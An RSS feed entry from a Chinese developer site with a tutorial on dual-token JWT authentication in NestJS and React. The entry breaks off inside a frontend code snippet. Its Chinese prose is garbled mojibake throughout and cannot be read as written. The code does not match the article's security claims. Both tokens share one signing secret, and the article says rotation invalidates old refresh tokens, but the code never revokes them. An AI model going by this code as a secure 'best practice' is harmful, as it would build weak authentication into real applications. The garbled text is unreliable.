<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[ğŸ”¥ åŒTokenç™»å½•é‰´æƒä½“ç³»æ·±åº¦è§£æï¼šNestJS + React å®æˆ˜è¯¦è§£]]></title>    <link>https://juejin.cn/post/7600976289063616512</link>    <guid>https://juejin.cn/post/7600976289063616512</guid>    <pubDate>2026-01-30T10:48:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600976289063616512" data-draft-id="7600837236620804148" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ”¥ åŒTokenç™»å½•é‰´æƒä½“ç³»æ·±åº¦è§£æï¼šNestJS + React å®æˆ˜è¯¦è§£"/> <meta itemprop="keywords" content="NestJS,React.js"/> <meta itemprop="datePublished" content="2026-01-30T10:48:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ €ç§‹666"/> <meta itemprop="url" content="https://juejin.cn/user/2566698322650307"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ”¥ åŒTokenç™»å½•é‰´æƒä½“ç³»æ·±åº¦è§£æï¼šNestJS + React å®æˆ˜è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2566698322650307/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ €ç§‹666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T10:48:21.000Z" title="Fri Jan 30 2026 10:48:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ç°ä»£å‰åç«¯åˆ†ç¦»æ¶æ„ä¸­ï¼Œç”¨æˆ·è®¤è¯ä¸æƒé™æ§åˆ¶æ˜¯ç³»ç»Ÿå®‰å…¨çš„ç¬¬ä¸€é“é˜²çº¿ã€‚å• Token æ–¹æ¡ˆè™½ç„¶ç®€å•ï¼Œä½†éš¾ä»¥å…¼é¡¾<strong>å®‰å…¨æ€§</strong>ä¸<strong>ç”¨æˆ·ä½“éªŒ</strong>ï¼šçŸ­æœ‰æ•ˆæœŸçš„ Token ä¼šé¢‘ç¹ä¸­æ–­ç”¨æˆ·æ“ä½œï¼Œè€Œé•¿æœ‰æ•ˆæœŸçš„ Token åˆ™å­˜åœ¨è¢«ç›—ç”¨åé•¿æœŸæœ‰æ•ˆçš„é£é™©ã€‚</p>
<p><strong>åŒ Token æœºåˆ¶ï¼ˆaccess_token + refresh_tokenï¼‰</strong> æ­£æ˜¯ä¸ºè§£å†³è¿™ä¸€çŸ›ç›¾è€Œç”Ÿâ€”â€”å®ƒé€šè¿‡ä¸¤ä¸ªèŒè´£åˆ†æ˜ã€ç”Ÿå‘½å‘¨æœŸä¸åŒçš„ Tokenï¼Œåœ¨ä¿éšœæ¥å£å®‰å…¨çš„åŒæ—¶ï¼Œå®ç°â€œæ— æ„Ÿç»­æœŸâ€çš„ä¸æ»‘ä½“éªŒã€‚</p>
<p>æœ¬æ–‡å°†èšç„¦äº <strong>åŒ Token ç™»å½•æ¨¡å—çš„æ ¸å¿ƒé€»è¾‘å®ç°</strong>ï¼ŒåŸºäº NestJSï¼ˆåç«¯ï¼‰ä¸ Reactï¼ˆå‰ç«¯ï¼‰æŠ€æœ¯æ ˆï¼Œæ·±å…¥å‰–æä»ç™»å½•ç”Ÿæˆ Tokenã€è¯·æ±‚æºå¸¦ Tokenã€åˆ°è¿‡æœŸè‡ªåŠ¨åˆ·æ–°çš„å®Œæ•´é“¾è·¯ã€‚æ‰€æœ‰ä»£ç å‡æ¥è‡ªçœŸå®é¡¹ç›®ï¼Œé€»è¾‘ä¸¥è°¨ã€å¯ç›´æ¥å¤ç”¨ï¼ŒåŠ©ä½ æ„å»ºé«˜å®‰å…¨ã€é«˜å¯ç”¨çš„è®¤è¯ä½“ç³»ã€‚</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€åŒTokenæœºåˆ¶ï¼šä¸ºä»€ä¹ˆæ˜¯â€œæœ€ä½³å®è·µâ€ï¼Ÿ</h2>
<h3 data-id="heading-2">1.1 æ ¸å¿ƒè§’è‰²åˆ†å·¥</h3>
<ul>
<li>
<p><strong><code>access_token</code>ï¼ˆè®¿é—®ä»¤ç‰Œï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šç”¨äºè®¿é—®å—ä¿æŠ¤çš„ API æ¥å£ï¼ˆå¦‚å‘å¸ƒæ–‡ç« ã€ä¿®æ”¹èµ„æ–™ï¼‰ã€‚</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼š<strong>çŸ­æ—¶æ•ˆ</strong>ï¼ˆé€šå¸¸ 10~30 åˆ†é’Ÿï¼‰ï¼Œä¸€æ—¦æ³„éœ²ï¼Œæ”»å‡»çª—å£æå°ã€‚</li>
<li><strong>ä¼ è¾“æ–¹å¼</strong>ï¼šæ”¾åœ¨ HTTP è¯·æ±‚å¤´ <code>Authorization: Bearer &lt;token&gt;</code> ä¸­ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>refresh_token</code>ï¼ˆåˆ·æ–°ä»¤ç‰Œï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šä»…ç”¨äºè°ƒç”¨ <code>/auth/refresh</code> æ¥å£ï¼Œæ¢å–æ–°çš„ <code>access_token</code>ï¼ˆå’Œæ–°çš„ <code>refresh_token</code>ï¼‰ã€‚</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼š<strong>é•¿æ—¶æ•ˆ</strong>ï¼ˆå¦‚ 7 å¤©ï¼‰ï¼Œä½†<strong>ç»ä¸ç”¨äºä¸šåŠ¡æ¥å£</strong>ï¼Œæå¤§é™ä½æš´éœ²é£é™©ã€‚</li>
<li><strong>å­˜å‚¨å»ºè®®</strong>ï¼šå‰ç«¯åº”å­˜äº <code>HttpOnly Cookie</code> æˆ–å®‰å…¨çš„æŒä¹…åŒ–å­˜å‚¨ï¼ˆå¦‚åŠ å¯† localStorageï¼‰ã€‚</li>
</ul>
</li>
</ul>
<blockquote>
<p>âœ… <strong>å®‰å…¨ä¼˜åŠ¿</strong>ï¼šå³ä½¿ <code>access_token</code> è¢«çªƒå–ï¼Œæ”»å‡»è€…ä¹Ÿæ— æ³•é•¿æœŸä½¿ç”¨ï¼›è‹¥ <code>refresh_token</code> è¢«ç›—ï¼Œå› å…¶ä¸å‚ä¸ä¸šåŠ¡è¯·æ±‚ï¼Œæ£€æµ‹å’Œæ’¤é”€ä¹Ÿæ›´å®¹æ˜“ã€‚</p>
</blockquote>
<h3 data-id="heading-3">1.2  å®Œæ•´æµç¨‹</h3>
<p>ç”¨æˆ·ç™»å½•æ—¶ï¼Œå‰ç«¯å‘é€è´¦å·å¯†ç è‡³åç«¯ <code>/auth/login</code> æ¥å£ã€‚åç«¯éªŒè¯é€šè¿‡åï¼Œç­¾å‘ä¸€å¯¹ Tokenï¼šçŸ­æ—¶æ•ˆï¼ˆ15åˆ†é’Ÿï¼‰çš„ <code>access_token</code> ç”¨äºè®¿é—®ä¸šåŠ¡æ¥å£ï¼Œé•¿æ—¶æ•ˆï¼ˆ7å¤©ï¼‰çš„ <code>refresh_token</code> ä»…ç”¨äºåˆ·æ–°ã€‚å‰ç«¯å°†åŒ Token æŒä¹…åŒ–å­˜å‚¨ï¼Œå¹¶åœ¨åç»­è¯·æ±‚å¤´ä¸­è‡ªåŠ¨æºå¸¦ <code>access_token</code>ã€‚</p>
<p>å½“ <code>access_token</code> è¿‡æœŸï¼Œåç«¯è¿”å› 401ã€‚å‰ç«¯æ‹¦æˆªè¯¥é”™è¯¯ï¼Œè‹¥å­˜åœ¨æœ‰æ•ˆ <code>refresh_token</code>ï¼Œåˆ™è°ƒç”¨ <code>/auth/refresh</code> è·å–æ–° Token å¯¹ï¼ˆå®ç° Token è½®æ¢ï¼Œæ—§ refresh_token ç«‹å³å¤±æ•ˆï¼‰ã€‚åˆ·æ–°æœŸé—´çš„å¹¶å‘è¯·æ±‚è¢«æš‚å­˜é˜Ÿåˆ—ï¼Œå¾…æ–° <code>access_token</code> è¿”å›åç»Ÿä¸€é‡å‘ï¼Œå…¨ç¨‹ç”¨æˆ·æ— æ„Ÿã€‚</p>
<p>è‹¥ <code>refresh_token</code> ä¹Ÿè¿‡æœŸï¼Œåˆ™æ¸…ç©ºæœ¬åœ°çŠ¶æ€å¹¶è·³è½¬ç™»å½•é¡µã€‚è¯¥æœºåˆ¶å…¼é¡¾å®‰å…¨ï¼ˆçŸ­ Token + è½®æ¢ï¼‰ä¸ä½“éªŒï¼ˆè‡ªåŠ¨ç»­æœŸï¼‰ï¼Œæ˜¯å‰åç«¯åˆ†ç¦»æ¶æ„ä¸‹çš„è®¤è¯æœ€ä½³å®è·µã€‚</p>
<hr/>
<h2 data-id="heading-4">äºŒã€åç«¯å®ç°ï¼šNestJS å¦‚ä½•ç”Ÿæˆä¸éªŒè¯åŒTokenï¼Ÿ</h2>
<blockquote>
<p>âš ï¸ ä»¥ä¸‹ä»£ç åŸºäºå·²æ­å»ºå¥½çš„ NestJS é¡¹ç›®ï¼Œä»…èšç„¦è®¤è¯æ¨¡å—æ ¸å¿ƒé€»è¾‘ã€‚</p>
</blockquote>
<h3 data-id="heading-5">2.1 ç™»å½•æ¥å£ï¼šç”ŸæˆåŒTokenå¯¹</h3>
<p>ç™»å½•æˆåŠŸåï¼Œåç«¯éœ€åŒæ—¶ç”Ÿæˆ <code>access_token</code> å’Œ <code>refresh_token</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/auth/auth.service.ts</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">generateTokens</span>(<span class="hljs-params">id: <span class="hljs-built_in">string</span>, name: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> payload = { <span class="hljs-attr">sub</span>: id, name }; <span class="hljs-comment">// sub æ˜¯ JWT è§„èŒƒå­—æ®µï¼Œä»£è¡¨ä¸»ä½“ï¼ˆç”¨æˆ·IDï¼‰</span>
  
  <span class="hljs-keyword">const</span> [at, rt] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">jwtService</span>.<span class="hljs-title function_">signAsync</span>(payload, {
      <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">'15m'</span>,
      <span class="hljs-attr">secret</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">TOKEN_SECRET</span>
    }),
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">jwtService</span>.<span class="hljs-title function_">signAsync</span>(payload, {
      <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">'7d'</span>,
      <span class="hljs-attr">secret</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">TOKEN_SECRET</span>
    })
  ]);

  <span class="hljs-keyword">return</span> { <span class="hljs-attr">access_token</span>: at, <span class="hljs-attr">refresh_token</span>: rt };
}
</code></pre>
<h4 data-id="heading-6">å…³é”®è®¾è®¡ç‚¹ï¼š</h4>
<ul>
<li><strong><code>Promise.all</code> å¹¶å‘ç”Ÿæˆ</strong>ï¼šJWT ç­¾åæ¶‰åŠåŠ å¯†è¿ç®—ï¼Œä¸²è¡Œæ‰§è¡Œä¼šå¢åŠ å“åº”æ—¶é—´ï¼Œå¹¶å‘å¯æå‡æ€§èƒ½ã€‚</li>
<li><strong>ç»Ÿä¸€ Payload ç»“æ„</strong>ï¼šä¸¤ä¸ª Token ä½¿ç”¨ç›¸åŒçš„è½½è·ï¼ˆç”¨æˆ· ID å’Œç”¨æˆ·åï¼‰ï¼Œä¾¿äºåç»­è§£æä¸€è‡´æ€§ã€‚</li>
<li><strong><code>sub</code> å­—æ®µè§„èŒƒ</strong>ï¼šsub æ˜¯ JWT è§„èŒƒå­—æ®µï¼Œä»£è¡¨ä¸»ä½“ï¼ˆç”¨æˆ·IDï¼‰</li>
</ul>
<h3 data-id="heading-7">2.2 åˆ·æ–°æ¥å£ï¼šToken è½®æ¢ï¼ˆToken Rotationï¼‰</h3>
<p>å½“ <code>access_token</code> è¿‡æœŸï¼Œå‰ç«¯è°ƒç”¨ <code>/auth/refresh</code> è·å–æ–° Tokenï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">refreshToken</span>(<span class="hljs-params">rt: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> payload = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">jwtService</span>.<span class="hljs-title function_">verifyAsync</span>(rt, {
      <span class="hljs-attr">secret</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">TOKEN_SECRET</span>
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateTokens</span>(payload.<span class="hljs-property">sub</span>, payload.<span class="hljs-property">name</span>);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnauthorizedException</span>(<span class="hljs-string">'Refresh Token å·²å¤±æ•ˆï¼Œè¯·é‡æ–°ç™»å½•'</span>);
  }
}
</code></pre>
<h4 data-id="heading-8">ä¸ºä½•è¦â€œè½®æ¢â€ï¼Ÿ</h4>
<ul>
<li><strong>å®‰å…¨æ€§å¢å¼º</strong>ï¼šæ¯æ¬¡åˆ·æ–°éƒ½ç”Ÿæˆ<strong>å…¨æ–°çš„ <code>refresh_token</code></strong>ï¼Œæ—§çš„ç«‹å³å¤±æ•ˆã€‚å³ä½¿æ—§ <code>refresh_token</code> è¢«ç›—ï¼Œä¹Ÿæ— æ³•å†æ¬¡ä½¿ç”¨ã€‚</li>
<li><strong>é˜²æ­¢ Token æ— é™ç»­æœŸ</strong>ï¼šé¿å…ç”¨æˆ·â€œæ°¸è¿œä¸ç™»å‡ºâ€ï¼Œç¬¦åˆæœ€å°æƒé™åŸåˆ™ã€‚</li>
</ul>
<blockquote>
<p>ğŸ›¡ï¸ <strong>è¿›é˜¶å»ºè®®</strong>ï¼šç”Ÿäº§ç¯å¢ƒå¯å°† <code>refresh_token</code> å­˜å…¥ Redisï¼Œå¹¶è®¾ç½® TTLï¼ˆå¦‚ 7 å¤©ï¼‰ï¼ŒåŒæ—¶ç»´æŠ¤ä¸€ä¸ªâ€œé»‘åå•â€ç”¨äºå¼ºåˆ¶ä¸‹çº¿ã€‚</p>
</blockquote>
<h3 data-id="heading-9">2.3 é‰´æƒå®ˆå«ï¼šä¿æŠ¤æ•æ„Ÿæ¥å£</h3>
<p>NestJS é€šè¿‡ <code>Guard</code> + <code>Strategy</code> å®ç°å£°æ˜å¼é‰´æƒï¼š</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// jwt.strategy.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JwtStrategy</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">PassportStrategy</span>(<span class="hljs-params"><span class="hljs-type">Strategy</span></span>) </span>{
  constructor() {
    <span class="hljs-keyword">super</span>({
      jwtFromRequest: <span class="hljs-type">ExtractJwt</span>.fromAuthHeaderAsBearerToken(),
      ignoreExpiration: <span class="hljs-literal">false</span>,
      secretOrKey: process.env.<span class="hljs-type">TOKEN_SECRET</span>
    });
  }

  validate(payload) {
    <span class="hljs-keyword">return</span> { id: payload.sub, name: payload.name }; <span class="hljs-comment">// æŒ‚è½½åˆ° req.user</span>
  }
}
</code></pre>
<p>åœ¨æ§åˆ¶å™¨ä¸­ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Post</span>()
<span class="hljs-variable">@UseGuards</span>(JwtAuthGuard)
<span class="hljs-built_in">createPost</span>(<span class="hljs-variable">@Req</span>() req) {
  <span class="hljs-selector-tag">const</span> <span class="hljs-selector-tag">userId</span> = <span class="hljs-selector-tag">req</span><span class="hljs-selector-class">.user</span><span class="hljs-selector-class">.id</span>; <span class="hljs-comment">// è‡ªåŠ¨è·å–å½“å‰ç”¨æˆ·ID</span>
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>åœ¨ NestJS ä¸­ï¼Œ<strong>Strategyï¼ˆç­–ç•¥ï¼‰</strong> è´Ÿè´£å…·ä½“çš„è®¤è¯é€»è¾‘ï¼Œæ¯”å¦‚ä»è¯·æ±‚å¤´æå– JWT å¹¶éªŒè¯å…¶æœ‰æ•ˆæ€§ï¼ŒéªŒè¯é€šè¿‡åè¿”å›ç”¨æˆ·ä¿¡æ¯ï¼›å®ƒä¸æ§åˆ¶è¯·æ±‚æµç¨‹ï¼Œåªåšèº«ä»½è§£æã€‚è€Œ <strong>Guardï¼ˆå®ˆå«ï¼‰</strong> æ˜¯ NestJS çš„æ‰§è¡Œé’©å­ï¼Œè¿è¡Œåœ¨æ§åˆ¶å™¨ä¹‹å‰ï¼Œç”¨äºå†³å®šæ˜¯å¦æ”¾è¡Œè¯·æ±‚ã€‚Guard ä¼šè°ƒç”¨å¯¹åº”çš„ Strategyï¼šè‹¥è®¤è¯æˆåŠŸï¼Œå°†ç”¨æˆ·ä¿¡æ¯æŒ‚è½½åˆ° <code>req.user</code> å¹¶å…è®¸è¿›å…¥è·¯ç”±ï¼›è‹¥å¤±è´¥ï¼ˆå¦‚ Token æ— æ•ˆæˆ–è¿‡æœŸï¼‰ï¼Œåˆ™ç›´æ¥æŠ›å‡º 401 é”™è¯¯ï¼Œä¸­æ–­åç»­æ“ä½œã€‚é€šå¸¸ï¼Œ<code>JwtStrategy</code> å®ç° JWT éªŒè¯ï¼Œ<code>JwtAuthGuard</code> å°è£…è¯¥ç­–ç•¥å¹¶ä½œä¸ºå®ˆå«ä½¿ç”¨ã€‚äºŒè€…åˆ†å·¥æ˜ç¡®ï¼šStrategy æ˜¯â€œéªŒç¥¨å‘˜â€ï¼ŒGuard æ˜¯â€œå®ˆé—¨äººâ€ï¼Œå…±åŒå®ç°å®‰å…¨ã€å¯å¤ç”¨çš„é‰´æƒæœºåˆ¶ã€‚</p>
<h4 data-id="heading-10">å®ˆå«å·¥ä½œæµç¨‹ï¼š</h4>
<ol>
<li>è¯·æ±‚åˆ°è¾¾æ—¶ï¼Œå®ˆå«æ‹¦æˆªï¼›</li>
<li>ä» <code>Authorization</code> å¤´æå– <code>Bearer &lt;token&gt;</code>ï¼›</li>
<li>éªŒè¯ç­¾åã€æ£€æŸ¥æ˜¯å¦è¿‡æœŸï¼›</li>
<li>è‹¥æœ‰æ•ˆï¼Œè°ƒç”¨ <code>validate()</code>ï¼Œç»“æœæŒ‚è½½åˆ° <code>req.user</code>ï¼›</li>
<li>æ§åˆ¶å™¨æ–¹æ³•ä¸­ç›´æ¥ä½¿ç”¨ <code>req.user</code>ï¼Œæ— éœ€æ‰‹åŠ¨è§£æ Tokenã€‚</li>
</ol>
<blockquote>
<p>â— <strong>å¸¸è§å‘</strong>ï¼šè‹¥æŠ¥é”™ <code>Unknown authentication strategy "jwt"</code>ï¼Œè¯·ç¡®ä¿ <code>JwtStrategy</code> å·²åœ¨ <code>AuthModule</code> çš„ <code>providers</code> ä¸­æ³¨å†Œã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-11">ä¸‰ã€å‰ç«¯å®ç°ï¼šReact å¦‚ä½•ç®¡ç†ä¸è‡ªåŠ¨åˆ·æ–° Tokenï¼Ÿ</h2>
<p>å‰ç«¯çš„æ ¸å¿ƒæŒ‘æˆ˜æ˜¯ï¼š<strong>å¦‚ä½•åœ¨ Token è¿‡æœŸæ—¶ï¼Œè‡ªåŠ¨åˆ·æ–°å¹¶é‡è¯•å¤±è´¥è¯·æ±‚ï¼Œä¸”ä¸é€ æˆé‡å¤åˆ·æ–°æˆ–æ­»å¾ªç¯ï¼Ÿ</strong></p>
<h3 data-id="heading-12">3.1 Token æŒä¹…åŒ–ï¼šZustand + persist</h3>
<p>ä½¿ç”¨ Zustand çš„ <code>persist</code> ä¸­é—´ä»¶ï¼Œå°† Token å­˜å…¥ <code>localStorage</code>ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// useUserStore.ts</span>
<span class="hljs-selector-tag">export</span> <span class="hljs-selector-tag">const</span> <span class="hljs-selector-tag">useUserStore</span> = <span class="hljs-selector-tag">create</span>&lt;<span class="hljs-selector-tag">UserState</span>&gt;()(
  <span class="hljs-built_in">persist</span>(
    (set) =&gt; ({
      <span class="hljs-attribute">accessToken</span>: null,
